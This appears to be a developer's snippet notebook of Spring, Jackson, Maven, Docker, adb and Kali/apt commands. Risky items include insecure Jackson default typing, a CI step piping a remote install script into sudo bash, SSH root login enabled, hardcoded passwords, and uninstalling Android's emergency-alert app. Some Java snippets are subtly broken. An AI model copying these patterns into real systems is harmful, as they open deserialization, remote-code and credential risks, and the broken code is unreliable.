public class CustomDateSerializer extends StdSerializer<Ticket> {
    private final ObjectMapper om;

    public CustomDateSerializer() {
        super(Ticket.class);
        this.om = new ObjectMapper().enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL, JsonTypeInfo.As.PROPERTY);
    }

    @Override
    public void serialize(final Ticket value, JsonGenerator gen, SerializerProvider arg2) throws IOException {
        gen.writeBinary(this.om.writeValueAsBytes(value));
    }

//    @Override
//    public Ticket deserialize(final byte[] bytes) throws SerializationException {
//        if (bytes == null) {
//            return null;
//        }
//        try {
//            return om.readValue(bytes, Ticket.class);
//        } catch (Exception e) {
//            throw new SerializationException(e.getMessage(), e);
//        }
//    }
}
--------------------------------------------------------------------------------------------------------
//        Jackson2JsonRedisSerializer jackson2JsonRedisSerializer = new Jackson2JsonRedisSerializer(Object.class);
//        ObjectMapper objectMapper = new ObjectMapper();
//        objectMapper.setVisibility(PropertyAccessor.ALL, JsonAutoDetect.Visibility.ANY);
//        objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);
//        jackson2JsonRedisSerializer.setObjectMapper(objectMapper);
//        redisTemplate.setValueSerializer(jackson2JsonRedisSerializer);
--------------------------------------------------------------------------------------------------------
@Bean
	@Scope(value="thread", proxyMode = ScopedProxyMode.TARGET_CLASS)
	public CacheManager threadCaches() {
		log.debug("Creating a new thread cache");
		SimpleCacheManager cache = new SimpleCacheManager();
		cache.setCaches(singleton(new ConcurrentMapCache("countries")));
		return cache;
	}
	
	@Bean
	@Primary
	public CacheManager mainCacheManager() {
		return new CompositeCacheManager(threadCaches());
	}
--------------------------------------------------------------------------------------------------------
@JsonTypeInfo(
	user = JsonTypeInfo.Id.NAME,
	include = As.PROPERTY,
	property = "type"
)
@JsonSubTypes(
	{
		@JsonSubTypes.Type(value = Gateway.class, name = "gateway")
		@JsonSubTypes.Type(value = Sensor.class, name = "sensor")
	}
)
public class Device {

}

@JsonTypeName("gateway")
public class Gateway extends Device {
	public string sn;
}
@JsonTypeName("sensor")
public class Sensor extends Device {
	public String gatewaySN;
	public int channel;
}
--------------------------------------------------------------------------------------------------------
class MyRepositoryImpl<T, ID extends Serializable>
  extends SimpleJpaRepository<T, ID> {

  private final EntityManager entityManager;

  MyRepositoryImpl(JpaEntityInformation entityInformation,
                          EntityManager entityManager) {
    super(entityInformation, entityManager);

    // Keep the EntityManager around to used from the newly introduced methods.
    this.entityManager = entityManager;
  }

  @Transactional
  public <S extends T> S save(S entity) {
    // implementation goes here
  }
}
--------------------------------------------------------------------------------------------------------
# mysql
spring.datasource.url=jdbc:mysql://localhost:3306/mytest?useSSL=false&useUnicode=true&characterEncoding=utf-8&zeroDateTimeBehavior=convertToNull
spring.datasource.username=root
spring.datasource.password=root123

spring.datasource.driver-class-name=com.mysql.jdbc.Driver
spring.datasource.hikari.connection-timeout=3000
spring.datasource.hikari.initialization-fail-fast=true
spring.datasource.hikari.max-lifetime=600000
spring.datasource.hikari.maximum-pool-size=20
spring.datasource.hikari.minimum-idle=20000
spring.datasource.hikari.idle-timeout=300000
spring.datasource.hikari.initialization=true


spring.jpa.database=mysql
spring.jpa.database-platform=org.hibernate.dialect.MySQL5InnoDBDialect
spring.jpa.hibernate.dialect=org.hibernate.dialect.MySQL5InnoDBDialect
spring.jpa.hibernate.ddl-auto=update
spring.jpa.show-sql=true
spring.transaction.rollback-on-commit-failure=true

# redis
spring.redis.database=0
spring.redis.host=localhost
spring.redis.password=redis
spring.redis.port=6379

spring.redis.pool.maxActive=8
spring.redis.pool.maxWait=-1
spring.redis.pool.maxIdle=8
spring.redis.pool.minIdle=0
spring.redis.timeout=2000
--------------------------------------------------------------------------------------------------------
@Repository
@EnableScan
public interface ServiceItemRepository extends CrudRepository<ServiceItem, String> {
}

@Data
@DynamoDBTable(tableName = "tableName")
public class entityName implements Serializable {

    private static final long serialVersionUID = 1L;

    @Id
    @DynamoDBHashKey
    @DynamoDBAutoGeneratedKey
    private String id;

    @DynamoDBRangeKey
    private String rk;

    private String sy;
}
--------------------------------------------------------------------------------------------------------
    @Bean
    public KeyValueOperations keyValueTemplate() {
        return new KeyValueTemplate(keyValueAdapter());
    }

    @Bean
    public KeyValueAdapter keyValueAdapter() {
        return new MapKeyValueAdapter(WeakHashMap.class);
    }
--------------------------------------------------------------------------------------------------------
@Accessors(fluent = true)
--------------------------------------------------------------------------------------------------------
om.fasterxml.jackson.databind.JsonMappingException: Problem deserializing property 'id' (expected type: [simple type, class java.lang.String]; actual type: `java.util.UUID`), problem: argument type mismatch

@Data
@RequiredArgsConstructor(onConstructor = @__(@PersistenceConstructor))
@Document
public class Order {

	private final String id;
	private final String customerId;
	private final Date orderDate;
	private final List<LineItem> items;

	/**
	 * Creates a new {@link Order} for the given customer id and order date.
	 *
	 * @param customerId
	 * @param orderDate
	 */
	public Order(String customerId, Date orderDate) {
		this(null, customerId, orderDate, new ArrayList<LineItem>());
	}

	/**
	 * Adds a {@link LineItem} to the {@link Order}.
	 *
	 * @param item
	 * @return
	 */
	public Order addItem(LineItem item) {

		this.items.add(item);
		return this;
	}
}
--------------------------------------------------------------------------------------------------------
spring.h2.console.enabled=true
spring.h2.console.path=/h2_console
spring.datasource.url=jdbc:h2:file:~/h2/testdb
spring.datasource.username=sa
spring.datasource.password=
spring.datasource.driverClassName=org.h2.Driver
spring.jpa.hibernate.ddl-auto = update
spring.jpa.show-sql=true
--------------------------------------------------------------------------------------------------------
	@Test
	public void bindToValidatedBeanWithResourceAndNonEnumerablePropertySource() {
		ConfigurationPropertySources.from(new PropertySource<String>("test") {
			@Override
			public Object getProperty(String name) {
				return null;
			}
		}).forEach(this.sources::add);
		Validator validator = new SpringValidatorAdapter(Validation.byDefaultProvider()
				.configure().buildValidatorFactory().getValidator());
		this.binder.bind("foo", Bindable.of(ResourceBean.class),
				new ValidationBindHandler(validator));
	}
--------------------------------------------------------------------------------------------------------
version: 2.0
jobs:
  build:
    docker:
      - image: circleci/ruby:2.4.2-jessie-node
    steps:
      - checkout
      - run:
          name: "Update Node.js and npm"
          command: |
            curl -sSL "https://nodejs.org/dist/v11.10.0/node-v11.10.0-linux-x64.tar.xz" | sudo tar --strip-components=2 -xJ -C /usr/local/bin/ node-v11.10.0-linux-x64/bin/node
            curl https://www.npmjs.com/install.sh | sudo bash
      - run:
          name: Check current version of node
          command: node -v
--------------------------------------------------------------------------------------------------------
  <licenses>
     <license>
        <name>Lesser General Public License (LGPL) version 3.0</name>
        <url>https://www.gnu.org/licenses/lgpl-3.0.txt</url>
     </license>
     <license>
        <name>Apache Software License (ASL) version 2.0</name>
        <url>http://www.apache.org/licenses/LICENSE-2.0.txt</url>
     </license>
  </licenses>
--------------------------------------------------------------------------------------------------------
mvn help:effective-settings:
mvn deploy -e

curl -u username:password http://url/artifactory/libs-snapshot-local/com/myproject/api/1.0-SNAPSHOT/api-1.0-20160128.114425-1.jar --request PUT --data target/api-1.0-SNAPSHOT.jar
--------------------------------------------------------------------------------------------------------
<%@ page contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%@ page session="false"%>
<%@ taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c"%>
<%@taglib prefix="spring" uri="http://www.springframework.org/tags"%>
<%@ taglib prefix="form" uri="http://www.springframework.org/tags/form"%>

<!-- Begin Body -->
<div class="container">
	<div class="row">
		<div class="span12">
			<h2>簡單計算機</h2>
<table>
    <tr>
        <td colspan="5"><input type="text" readonly="readonly" id="_result" value="0" style="text-align:right;width:95%" /></td>
    </tr>
    <tr>
        <td><button id="_1" onclick="javascript: addNumber('1');">1</button></td>
        <td><button id="_2" onclick="javascript: addNumber('2');">2</button></td>
        <td><button id="_3" onclick="javascript: addNumber('3');">3</button></td>
        <td colspan="2"><button id="_C" style="width:85%">C</button></td>
    </tr>
    <tr>
        <td><button id="_4" onclick="javascript: addNumber('4');">4</button></td>
        <td><button id="_5" onclick="javascript: addNumber('5');">5</button></td>
        <td><button id="_6" onclick="javascript: addNumber('6');">6</button></td>
        <td><button id="_Plus" onclick="javascript: addOperator('+');">+</button></td>
        <td><button id="_Minus" onclick="javascript: addOperator('-');">-</button></td>
    </tr>
    <tr>
        <td><button id="_7" onclick="javascript: addNumber('7');">7</button></td>
        <td><button id="_8" onclick="javascript: addNumber('8');">8</button></td>
        <td><button id="_9" onclick="javascript: addNumber('9');">9</button></td>
        <td><button id="_Multiple" onclick="javascript: addOperator('*');">X</button></td>
        <td><button id="_Divide" onclick="javascript: addOperator('/');">/</button></td>
    </tr>
    <tr>
        <td colspan="2"><button id="_0" style="width:90%" onclick="javascript: addNumber('0');">0</button></td>
        <td colspan="2"><button id="_Undo" style="width:90%" onclick="javascript: undo();">Undo</button></td>
        <td colspan="2"><button id="_Equal" style="width:85%" onclick="javascript: compute();">=</button></td>
    </tr>

</table>
<input type="hidden" id="operand" value="0"/>
<input type="hidden" id="isReset" value="true"/>
<input type="hidden" id="operator" value="+"/>
		</div>
	</div>
</div>

    <script>
        function addNumber(number) {
            var currentVal = parseInt($("#_result").val(), 10);
            var isReset = $("#isReset").val();
            if (isReset == "true") {
                currentVal = 0;
            }
            var intVal = parseInt(number, 10);
            currentVal = currentVal * 10 + intVal;
            $("#isReset").val("false");
            $("#_result").val(currentVal);
        }
        function addOperator(operator) {
            var currentVal = parseInt($("#_result").val(), 10);
            $("#operand").val(currentVal);
            if ($("#operator").val() != "")
                compute();
            $("#operator").val(operator);
            $("#isReset").val("true");
        }
        function compute() {
            var operand = $("#operand").val();
            var operator = $("#operator").val();
            var inputdata = { operand: operand, operator: operator };
            $.ajax({
                type: 'GET',
                url: '${pageContext.request.contextPath }/cmd/cmpt',
                datatype: 'application/json',
                data: inputdata,
                async: false,
                success: function (data) {
                    $("#_result").val(data);
                }
            });
        }
        function undo() {
            $.ajax({
                type: 'GET',
                url: '${pageContext.request.contextPath }/cmd/undo',
                datatype: 'application/json',
                async: false,
                success: function (data) {
                    $("#_result").val(data);
                }
            });
        }
        $("#_C").click(function () {
            var inputdata = {};
            $.ajax({
                type: 'GET',
                url: '${pageContext.request.contextPath }/cmd/clr',
                datatype: 'application/json',
                data: inputdata,
                async: false,
                success: function (data) {
                    $("#_result").val(data);
                    $("#isReset").val("true");
                    $("#operator").val("+");
                    $("#operand").val("0");
                }
            });
        });
    </script>
--------------------------------------------------------------------------------------------------------
FROM java:8
VOLUME /tmp
ADD slackbot-0.0.1-SNAPSHOT.jar app.jar
RUN bash -c 'touch /app.jar'
EXPOSE 9119
ENTRYPOINT ["java","-Djava.security.egd=file:/dev/./urandom","-jar","/app.jar"]
--------------------------------------------------------------------------------------------------------
import com.ruubel.model.Bank
import com.ruubel.model.BankInformation
import com.ruubel.service.factory.ScraperFactoryService
import com.ruubel.service.observer.BankInformationPublisherService
import com.ruubel.service.strategy.BankScraperStrategy
import spock.lang.Specification

class BankServiceSpec extends Specification {

    BankService service
    BankInformationPublisherService bankInformationPublisherService
    ScraperFactoryService scraperFactoryService

    def setup() {
        bankInformationPublisherService = Mock(BankInformationPublisherService)
        scraperFactoryService = Mock(ScraperFactoryService)
        service = new BankService(bankInformationPublisherService, scraperFactoryService)
    }

    def "when empty list of strategies is defined, then scrapes none, publishes and returns empty list" () {
        when:
            List<BankInformation> contacts = service.getContacts()
        then:
            1 * service.scraperFactoryService.getStrategies() >> []
            1 * bankInformationPublisherService.publish([])
            contacts == []
    }

    def "when strategy is defined, then scrapes it, publishes and returns on element list" () {
        given:
            BankScraperStrategy scraper = Mock(BankScraperStrategy)
            BankInformation scrapeResult = new BankInformation(Bank.SEB, "12345")
        when:
            List<BankInformation> contacts = service.getContacts()
        then:
            1 * scraperFactoryService.getStrategies() >> [scraper]
            1 * scraper.scrape() >> scrapeResult
            1 * bankInformationPublisherService.publish([scrapeResult])
            contacts == [scrapeResult]
    }

}
--------------------------------------------------------------------------------------------------------
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;

import java.io.IOException;

/**
 * A wrapper service for testing purposes
 */
public class HttpFetchService {

    public Document get(String url) throws IOException {
        return Jsoup.connect(url).get();
    }
}
--------------------------------------------------------------------------------------------------------
	@Override
	public BankInformation scrape() {
		String number = "FAILED";
		try {
			Document doc = httpFetchService.get(bankUrl);

			Elements content = doc.select(".field-type-text-with-summary");
			Elements tables = content.get(0).select("table");
			Elements tds = tables.get(0).select("td");
			number = tds.get(3).text();
		} catch (Exception e) {
			e.printStackTrace();
		}

		return new BankInformation(Bank.SEB, number);
	}
--------------------------------------------------------------------------------------------------------
    public void sort(int[] arr)
    {
        int size=arr.length; 
        for (int i=1;i<size;i++) // starting from index no 1 because it assumes first index as sorted
        {
            int t=i-1;
            int temp=arr[i];
            for (;t>=0&&arr[t]>temp;t--) 
                {
                    arr[t+1]=arr[t];
                }
            arr[t+1]=temp;
        }
    }
--------------------------------------------------------------------------------------------------------
PRAGMA foreign_keys = "1";
SELECT type,name,sql,tbl_name,'0' AS temp FROM sqlite_master UNION SELECT type,name,sql,tbl_name,'1' AS temp FROM sqlite_temp_master;
PRAGMA encoding
SELECT COUNT(*) FROM (SELECT `_rowid_`,* FROM `android_metadata` ORDER BY `_rowid_` ASC);
SELECT `_rowid_`,* FROM `android_metadata` ORDER BY `_rowid_` ASC LIMIT 0, 50000;
SELECT COUNT(*) FROM (SELECT `_rowid_`,* FROM `android_metadata` ORDER BY `_rowid_` ASC);
SELECT `_rowid_`,* FROM `android_metadata` ORDER BY `_rowid_` ASC LIMIT 0, 50000;
SELECT COUNT(*) FROM (SELECT `_rowid_`,* FROM `android_metadata` ORDER BY `_rowid_` ASC);
SELECT `_rowid_`,* FROM `android_metadata` ORDER BY `_rowid_` ASC LIMIT 0, 50000;
--------------------------------------------------------------------------------------------------------
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.Properties;

public class LoggerUtils {

    static {
        configuration();
    }

    private static void configuration() {
        Properties props = new Properties();
        try {
            props.load(
                new BufferedReader(
                    new InputStreamReader(
                        LoggerUtils.class.getResourceAsStream("/log4jstructuraldp.properties")
                    )
                )
            );
        } catch (IOException e) {
            System.out.println("log4jstructuraldp.properties file not configured properly");
            System.exit(0);
        }
        PropertyConfigurator.configure(props);
    }
}
--------------------------------------------------------------------------------------------------------
keytool -genkey -alias tomcat -keyalg RSA -storepass changeit -keypass changeit -dname 'CN=tomcat'

<Connector port="8080" protocol="HTTP/1.1"
   connectionTimeout="20000"
   redirectPort="8443" />
 
<Connector port="8443" protocol="org.apache.coyote.http11.Http11NioProtocol"
   maxThreads="150" SSLEnabled="true" scheme="https" secure="true"
   clientAuth="false" sslProtocol="TLS"
   keystoreFile="${user.home}/.keystore" keystorePass="changeit" />
   
http.requiresChannel()
  .anyRequest().requiresInsecure();
--------------------------------------------------------------------------------------------------------
<pluginGroup>org.sonatype.plugins</pluginGroup>

mvn nexus-staging:rc-list
mvn nexus-staging:rc-close -DserverId=nexus -
DnexusUrl=http://localhost:8081/nexus

mvn nexus-staging:rc-promote -DserverId=local-nexus -DnexusUrl=http://localhost:8081/nexus -DbuildPromotionProfileId=foo -DstagingRepositoryId=repo1,repo2 -DstagingDescription="The reason I promote these is..."
mvn nexus-staging:rc-release -DserverId=local-nexus -DnexusUrl=http://localhost:8081/nexus -DstagingRepositoryId=repo1,repo2 -DstagingDescription="The reason I release these is..."
mvn nexus-staging:rc-drop -DserverId=local-nexus -DnexusUrl=http://localhost:8081/nexus -DstagingRepositoryId=repo1,repo2 -DstagingDescription="The reason I drop these is..."
mvn nexus-staging:rc-close -DserverId=local-nexus -DnexusUrl=http://localhost:8081/nexus -DstagingRepositoryId=repo1,repo2 -DstagingDescription="The reason I close these is..."
--------------------------------------------------------------------------------------------------------
@RequestMapping(method = RequestMethod.GET, value = "/report")
	public List<Employee> EmployeeReport() throws ServletException, IOException {
		// Lets say this method gets all EmployeeDetails First
		System.out.println("Starting");
		List<Employee> empList = new EmployeeService().getEmployees();

		Runnable myrunLambda = () -> {
			// Say there is a ReportUtil which takes the list data, does some calculations
			// and dumps the report at a specific location
			String reportPath = ReportUtil.generateReport();
			// Finally say we have an email service which picks the report and send to
			// admin.
			EmailUtil.sendReport(reportPath);

		};
		new Thread(myrunLambda).start();
		System.out.println("Ending");
		// Finally return the employee's count
		return null;
	}
--------------------------------------------------------------------------------------------------------
skipNexusStagingDeployMojo

<settings>
  <mirrors>
    <mirror>
      <!--This sends everything else to /public -->
      <id>nexus</id>
      <mirrorOf>*</mirrorOf>
      <url>http://localhost:8081/nexus/content/groups/public</url>
    </mirror>
  </mirrors>
  <profiles>
    <profile>
      <id>nexus</id>
      <!--Enable snapshots for the built in central repo to direct -->
      <!--all requests to nexus via the mirror -->
      <repositories>
        <repository>
          <id>central</id>
          <url>http://central</url>
          <releases><enabled>true</enabled></releases>
          <snapshots><enabled>true</enabled></snapshots>
        </repository>
      </repositories>
     <pluginRepositories>
        <pluginRepository>
          <id>central</id>
          <url>http://central</url>
          <releases><enabled>true</enabled></releases>
          <snapshots><enabled>true</enabled></snapshots>
        </pluginRepository>
      </pluginRepositories>
    </profile>
  </profiles>
  <activeProfiles>
    <!--make the profile active all the time -->
    <activeProfile>nexus</activeProfile>
  </activeProfiles>
</settings>
--------------------------------------------------------------------------------------------------------
import android.content.Context;
import android.support.test.InstrumentationRegistry;
import android.support.test.runner.AndroidJUnit4;

import org.junit.Test;
import org.junit.runner.RunWith;

import static org.junit.Assert.*;

/**
 * Instrumentation test, which will execute on an Android device.
 *
 * @see <a href="http://d.android.com/tools/testing">Testing documentation</a>
 */
@RunWith(AndroidJUnit4.class)
public class ExampleInstrumentedTest {
    @Test
    public void useAppContext() throws Exception {
        // Context of the app under test.
        Context appContext = InstrumentationRegistry.getTargetContext();

        assertEquals("com.gohool.trymeoriginal.trymeoriginal", appContext.getPackageName());
    }
}
--------------------------------------------------------------------------------------------------------
#lang racket
;;insertion sort implementation
(define (sort lon)
  (cond [(empty? lon) lon]
        [else (insert (first lon) (sort (rest lon)))]))

(define (insert n lon)
  (cond [(empty? lon) (cons n lon)]
        [else
         (if (> n (first lon))
             (cons (first lon) (insert n (rest lon)))
             (cons n lon))]))
--------------------------------------------------------------------------------------------------------
spring.activemq.broker-url=tcp://172.17.42.1:61616
--------------------------------------------------------------------------------------------------------
#!/bin/bash

intro() {
    echo "Thank you for forking CodeZila"
    echo "Please input any names without any special characters"
    echo "For example: 'Insertion Sort' or 'Linked Lists'"
    read -p "What is the name of the algorithm or design you want to implement? " algorithm
    checkInput "$algorithm"    
    pickLanguague "$algorithm"
    printTree "$algorithm" "$language"
    checkDir "$algorithm"
}

# Checks the input to see if it does not have illegal characters
checkInput() {
    # $1 is the string being checked
    if [[ "$1" == *['!'@\$%^\&*()_+]* ]]
    then
      echo "Illegal character used"
      exit
    fi
}

# Asks the user that language they would like to use
pickLanguague() {
    echo "Select the language you want to implement "$1" in?"
    echo "1)  C++"
    echo "2)  C"
    echo "3)  C#"
    echo "4)  Java"
    echo "5)  JavaScript"
    echo "6)  GoLang"
    echo "7)  Python"
    echo "8)  Ruby"
    echo "9)  Other"
    read n
    case $n in 
        1) language='C++';;
        2) language='C';;
        3) language='C#';;
        4) language='Java';;
        5) language='JavaScript';;
        6) language='GoLang';;
        7) language='Python';;
        8) language='Ruby';;
        9) inputLanguage "$1";;
        *) echo "Error" ; exit;;
    esac

    createDir "$1" "$language"
}

inputLanguage() {
    read -p "What language do you want to implement '$1' in? " lang
    checkInput "$lang"
    createDir "$1" "$lang"
    printTree "$1" "$lang"
    checkDir
    exit
}

# Shows the user the created file structure
printTree() {
    echo "$1"
    echo "├── readme.md"
    echo "└── $2"
}

# Creates the file structure
createDir() {
    if [ ! -d "$1" ]
    then
        mkdir "$1"
    fi

    if [ ! -d "$1/$2" ]
    then
        mkdir "$1"/$2
    fi
    createReadme "$1" "$2"
}

createReadme() {
    if [ -e "$1"/"$2"/readme.md ]
    then
        echo "readme file already exists for '$1/$2'"
    else
        read -p "Do you want to create a Readme (y/n)? " response
        case "$response" in
            y|Y ) echo "# $1 implemented in $2" > "$1"/"$2"/readme.md;;
            n|N ) ;;
            * ) echo "Readme not created" ;;
        esac
    fi
}

# Asks the user if they want to keep the files
checkDir() {
    read -p "Is the file structure above correct? (y/n)? " choice
        case "$choice" in 
        y|Y ) echo "Enjoy Coding!";;
        n|N ) echo "Files Deleted"; rm -rf $1 ;;
        * ) echo "invalid - Files not deleted";;
    esac
}

intro
--------------------------------------------------------------------------------------------------------

import java.util.Iterator;
  
public class DinerMenuIterator implements Iterator {
	MenuItem[] list;
	int position = 0;
 
	public DinerMenuIterator(MenuItem[] list) {
		this.list = list;
	}
 
	public Object next() {
		MenuItem menuItem = list[position];
		position = position + 1;
		return menuItem;
	}
 
	public boolean hasNext() {
		if (position >= list.length || list[position] == null) {
			return false;
		} else {
			return true;
		}
	}
  
	public void remove() {
		if (position <= 0) {
			throw new IllegalStateException
				("You can't remove an item until you've done at least one next()");
		}
		if (list[position-1] != null) {
			for (int i = position-1; i < (list.length-1); i++) {
				list[i] = list[i+1];
			}
			list[list.length-1] = null;
		}
	}
}
--------------------------------------------------------------------------------------------------------
Markdown Presentations For Everyone on GitHub, GitLab, Bitbucket, GitBucket, Gitea, and Gogs.
$ docker build -t="hello-world-java" .
$ docker run -p 8080:8080 -it --rm hello-world-java
$ docker inspect --format '{{ .NetworkSettings.IPAddress }}' [ContainerId]
--------------------------------------------------------------------------------------------------------
```ruby
require 'redcarpet'
markdown = Redcarpet.new("Hello World!")
puts markdown.to_html
```

.of("security.oauth2.client.clientId:myclientid",
          "security.oauth2.client.clientSecret:mysecret",
          "security.oauth2.client.autoApproveScopes:read,write",
          "security.oauth2.client.accessTokenValiditySeconds:40",
          "security.oauth2.client.refreshTokenValiditySeconds:80")
--------------------------------------------------------------------------------------------------------
import java.lang.invoke.MethodHandle;
import java.lang.invoke.MethodHandles;
import java.lang.invoke.MethodType;

public class InvokeBug {
  static value class Value {
    private final int value;
    
    public Value(int value) {
      this.value = value;
    }
  }
  
  public static void method(Value value) {
    // empty
  }
  
  public static void main(String[] args) throws Throwable {
    MethodHandle method = MethodHandles.lookup().findStatic(InvokeBug.class, "method", MethodType.methodType(void.class, Value.class));
    method.invokeExact(new Value(42));
  }
}
--------------------------------------------------------------------------------------------------------
import java.util.Objects;

public final value class NullVT {
  private final boolean value;
  
  private NullVT() {
    value = false;
    throw new AssertionError();
  }

  public static NullVT of() {
    return __MakeDefault NullVT();
  }
  
  public static void foo(NullVT vt) {
    Objects.requireNonNull(vt);
  }
}
--------------------------------------------------------------------------------------------------------
language: android

jdk: oraclejdk8

android:
  components:
    - tools
    - platform-tools
    - build-tools-25.0.2
    - android-25
    - extra-android-m2repository

before_script:
  - echo no | android create avd --force -n test -t android-18 --abi armeabi-v7a
  - emulator -avd test -no-audio -no-window &
  - android-wait-for-emulator
  - adb shell input keyevent 82 &

script:
   - ./gradlew connectedAndroidTest coveralls
--------------------------------------------------------------------------------------------------------
for i in $(adb shell pm list packages | awk -F':' '{print $2}'); do adb pull "$(adb shell pm path $i | awk -F':' '{print $2}')"; mv base.apk $i.apk 2&> /dev/null ;done
adb shell pm uninstall --user 0 com.android.cellbroadcastreceiver   <--- kills presidential alert app!
adb shell pm list users
adb shell pm path com.example.someapp
adb pull /data/app/com.example.someapp-2.apk path/to/desired/destination
adb shell pm list packages -f -3

adb pull /sdcard/Android/data/com.bluemotionlabs.bluescan/files/scans/classic_scan_20190819_141752.json
adb pull /sdcard/Android/data/com.bluemotionlabs.bluescan/files/scans/classic_scan_20190819_141752.csv

adb pull "/sdcard/Nordic Semiconductor/" D:/adb/test

adb pull /sdcard/Android/data/com.bluemotionlabs.bluescan/files/scans/ D:/adb/test
adb backup -apk apk

adb shell 'cat `pm path com.example.name | cut -d':' -f2`' > app.apk

function android_pull_apk() {
    if [ -z "$1" ]; then
        echo "You must pass a package to this function!"
        echo "Ex.: android_pull_apk \"com.android.contacts\""
        return 1
    fi

    if [ -z "$(adb shell pm list packages | grep $1)" ]; then
        echo "You are typed a invalid package!"
        return 1
    fi

    apk_path="`adb shell pm path $1 | sed -e 's/package://g' | tr '\n' ' ' | tr -d '[:space:]'`"
    apk_name="`adb shell basename ${apk_path} | tr '\n' ' ' | tr -d '[:space:]'`"

    destination="$HOME/Documents/Android/APKs"
    mkdir -p "$destination"

    adb pull ${apk_path} ${destination}
    echo -e "\nAPK saved in \"$destination/$apk_name\""
}



for package in $(adb shell pm list packages -3 | tr -d '\r' | sed 's/package://g'); do apk=$(adb shell pm path $package | tr -d '\r' | sed 's/package://g'); echo "Pulling $apk"; adb pull -p $apk "$package".apk; done

adb pull /system/app/CertInstaller/CertInstaller.apk /Users/$(whoami)/Documents/APK/download_apk/

ls -la /Users/$(whoami)/Documents/


adb shell dumpsys activity activities | grep mFocusedActivity
adb shell pm path <packagename.apk>
adb shell cp /data/app/<packagename.apk> /sdcard
adb pull /sdcard/base.apk
--------------------------------------------------------------------------------------------------------
  @Retention(RUNTIME)
  @Target(METHOD)
   public @interface SecurityAnnotation {
   }
   //
   @Aspect
   @Component
   public class MyAspect {
    
    @Pointcut("@annotation(SecurityAnnotation) && args(user,..)")
    public void callAtMyServiceSecurityAnnotation(User user) { }

    @Around("callAtMyServiceSecurityAnnotation(user)")
    public Object aroundCallAt(ProceedingJoinPoint pjp, User user) {
        Object retVal = null;
        if (securityService.checkRight(user)) {
         retVal = pjp.proceed();
         }
        return retVal;
    }
--------------------------------------------------------------------------------------------------------
@Aspect
@Component
public class MyAspect {

    @Pointcut("execution(public * com.example.demoAspects.MyService.*(..))")
    public void callAtMyServicePublic() {
    }

    @Around("callAtMyServicePublic()")
    public Object aroundCallAt(ProceedingJoinPoint call) throws Throwable {
        StopWatch clock = new StopWatch(call.toString());
        try {
            clock.start(call.toShortString());
            return call.proceed();
        } finally {
            clock.stop();
            System.out.println(clock.prettyPrint());
        }
    }
}
--------------------------------------------------------------------------------------------------------
@Configuration
public class RequestCountMonitoringConfiguration extends WebMvcConfigurerAdapter {

  private Meter requestMeter;

  @Autowired
  public RequestCountMonitoringConfiguration(MetricRegistry metricRegistry) {
    this.requestMeter = metricRegistry.meter("http.requests");
  }

  @Override
  public void addInterceptors(InterceptorRegistry registry) {
    registry.addInterceptor(new HandlerInterceptorAdapter() {
      @Override
      public void afterCompletion(HttpServletRequest request,
          HttpServletResponse response, Object handler, Exception ex)
          throws Exception {
        requestMeter.mark();
      }
    });
  }
}

@ControllerAdvice
public class ControllerExceptionHandler {

  private MetricRegistry metricRegistry;

  @Autowired
  public ControllerExceptionHandler(MetricRegistry metricRegistry){
    this.metricRegistry = metricRegistry;
  }
  
  @ResponseStatus(value = HttpStatus.INTERNAL_SERVER_ERROR)
  @ExceptionHandler(Exception.class)
  @ResponseBody
  public String handleInternalError(Exception e) {
    countHttpStatus(HttpStatus.INTERNAL_SERVER_ERROR);
    logger.error("Returned HTTP Status 500 due to the following exception:", e);
    return "Internal Server Error";
  }
  
  private void countHttpStatus(HttpStatus status){
    Meter meter = metricRegistry.meter(String.format("http.status.%d", status.value()));
    meter.mark();
  }
}
--------------------------------------------------------------------------------------------------------
apt-get update
apt-get insatll ssh
systemctl enable ssh
service ssh start
nano /etc/ssh/sshd_config

PermitRootLogin yes

service ssh restart

https://codeby.net/threads/vkljuchenie-ssh-na-kali-linux.67703/

Как можно получить список всех доступных пакетов?

Чтобы увидеть все доступные пакеты, выполните следующую команду:
1
	
apt-cache pkgnames

Как можно найти имя пакета и его описание.

Чтобы найти название пакета и его описание перед установкой, используйте флаг «search». Использование “search” c apt-cache отобразит список подходящих пакетов с кратким описанием. Например, вы хотите найти описание пакета vsftpd: чтобы сделать это, команда должна быть вот такой:
1
	
apt-cache search vsftpd

Чтобы найти и перечислить все пакеты, имя которых начинается с vsftpd, вы можете использовать следующую команду:
1
	
apt-cache pkgnames vsftpd

Как я могу просмотреть информацию о пакете?

Например, если вы хотите ознакомиться с информацией о пакете, с его кратким описанием, отображающим номер версии, контрольные суммы, размер, размер после установки, категории и так далее, вы можете использовать подкоманду «show», как показано ниже:
1
	
apt-cache show netcat

Как можно проверить зависимости какого-либо пакета?

Чтобы проверить зависимости конкретного пакета, вы можете использовать подкоманду showpkg, чтобы узнать, установлены эти зависимости или нет. Например, используйте команду showpkg вместе с названием пакета.
1
	
apt-cache showpkg vsftpd

Как можно просмотреть статистику кэша?

Подкоманда stats отобразит полную статистику о кеше, например, полное число пакетов, найденное в кеше. Используйте такую команду:
1
	
apt-cache stats

Как обновить список пакетов в системе?

Команда update используется для синхронизации и обновления индексных файлов пакетов. Синхронизация происходит с источниками, указанными в файле /etc/apt/sources.list. Эту команду можно использовать, например, чтобы не упускать важные обновления пакетов.
1
	
sudo apt-get update

Как обновить пакеты в системе?

Команда upgrade используется для обновления всего установленного на данный момент софта в вашйе системе. Иногда может получиться так, что обновление установить нельзя из-за какого-либо другого пакета, который требует старую версию.
1
	
sudo apt-get upgrade

Но если вы хотите обновиться вне зависимости от требований пакетов, используйте подкоманду dist-upgrade:
1
	
sudo apt-get dist-upgrade

Как я могу установить или обновить какой-либо конкретный пакет?

Подкоманда install используется для установки или обновления какого-либо пакета.
1
	
sudo apt-get install netcat

Как я могу установить несколько пакетов сразу?

Вы можете ввести названия нескольих пакетов, чтобы установить их одновременно. Например, чтобы установить пакеты nethogs и goaccess, вы можете выполнить следующую команду:
1
	
sudo apt-get install nethogs goaccess

Как установить несколько пакетов по «маске» названия

С помощью регулярных вырежний вы можете добавлять несколько пакетов с помощью специальных символов. Например, можно использовать звездочку, чтобы установить все пакеты, которые содержат строку «name» в названии:
1
	
sudo apt-get install *name*

Как установить пакеты без обновления.

